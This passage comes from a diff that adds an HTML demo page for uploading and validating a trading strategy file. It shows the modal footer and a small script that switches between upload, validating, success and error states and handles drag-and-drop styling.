+          File stored securely. Never accessible publicly.
+        </div>
+        <div class="footer-actions" id="footerActions">
+          <button class="btn btn-ghost">Cancel</button>
+          <button class="btn btn-primary">
+            <svg viewBox="0 0 16 16" fill="currentColor"><path d="M7.47 1.97a.75.75 0 011.06 0l3.75 3.75a.75.75 0 01-1.06 1.06L8.75 4.31v7.94a.75.75 0 01-1.5 0V4.31L4.78 6.78a.75.75 0 01-1.06-1.06l3.75-3.75z"/></svg>
+            Upload &amp; Validate
+          </button>
+        </div>
+      </div>
+
+    </div><!-- end .modal -->
+  </div><!-- end .modal-overlay -->
+
+</div><!-- end .main -->
+
+<script>
+  function showState(s) {
+    // Hide all states
+    ['upload','validating','success','error'].forEach(n => {
+      document.getElementById('state-' + n).style.display = 'none';
+    });
+    document.getElementById('state-' + s).style.display = 'block';
+
+    // Update demo buttons
+    document.querySelectorAll('.demo-btn').forEach(b => b.classList.remove('active'));
+    event.target.classList.add('active');
+
+    // Update step indicators
+    const s1 = document.getElementById('step1');
+    const s2 = document.getElementById('step2');
+    const s3 = document.getElementById('step3');
+    const c1 = document.getElementById('conn1');
+    const c2 = document.getElementById('conn2');
+    [s1,s2,s3].forEach(el => { el.className = 'step-pip'; });
+    [c1,c2].forEach(el => { el.className = 'step-connector'; });
+
+    const title = document.getElementById('modalTitle');
+    const footerMeta = document.getElementById('footerMeta');
+    const footerActions = document.getElementById('footerActions');
+
+    if (s === 'upload') {
+      s1.classList.add('active');
+      title.textContent = 'Upload Strategy';
+      footerActions.innerHTML = `<button class="btn btn-ghost">Cancel</button><button class="btn btn-primary"><svg viewBox="0 0 16 16" fill="currentColor"><path d="M7.47 1.97a.75.75 0 011.06 0l3.75 3.75a.75.75 0 01-1.06 1.06L8.75 4.31v7.94a.75.75 0 01-1.5 0V4.31L4.78 6.78a.75.75 0 01-1.06-1.06l3.75-3.75z"/></svg>Upload &amp; Validate</button>`;
+    } else if (s === 'validating') {
+      s1.classList.add('done'); c1.classList.add('done'); s2.classList.add('active');
+      title.textContent = 'Validating...';
+      footerActions.innerHTML = `<button class="btn btn-ghost">Cancel</button><button class="btn btn-primary" disabled>Validating...</button>`;
+    } else if (s === 'success') {
+      s1.classList.add('done'); c1.classList.add('done'); s2.classList.add('done'); c2.classList.add('done'); s3.classList.add('done');
+      title.textContent = 'Strategy Ready';
+      footerMeta.innerHTML = '';
+      footerActions.innerHTML = `<button class="btn btn-ghost">Close</button><button class="btn btn-primary"><svg viewBox="0 0 16 16" fill="currentColor"><path d="M7.75 2a.75.75 0 01.75.75V7h4.25a.75.75 0 010 1.5H8.5v4.25a.75.75 0 01-1.5 0V8.5H2.75a.75.75 0 010-1.5H7V2.75A.75.75 0 017.75 2z"/></svg>Run Backtest</button>`;
+    } else if (s === 'error') {
+      s1.classList.add('done'); c1.classList.add('done'); s2.classList.add('active');
+      title.textContent = 'Validation Failed';
+      footerMeta.innerHTML = '';
+      footerActions.innerHTML = `<button class="btn btn-ghost">Close</button><button class="btn btn-primary"><svg viewBox="0 0 16 16" fill="currentColor"><path d="M7.47 1.97a.75.75 0 011.06 0l3.75 3.75a.75.75 0 01-1.06 1.06L8.75 4.31v7.94a.75.75 0 01-1.5 0V4.31L4.78 6.78a.75.75 0 01-1.06-1.06l3.75-3.75z"/></svg>Re-upload Fixed File</button>`;
+    }
+  }
+
+  // Drag-and-drop visual feedback (demo only)
+  const dz = document.querySelector('.dropzone');
+  if (dz) {
+    dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('dragover'); });
+    dz.addEventListener('dragleave', () => dz.classList.remove('dragover'));
+    dz.addEventListener('drop', e => { e.preventDefault(); dz.classList.remove('dragover'); });
+  }
+</script>
+
+</body>
+</html>
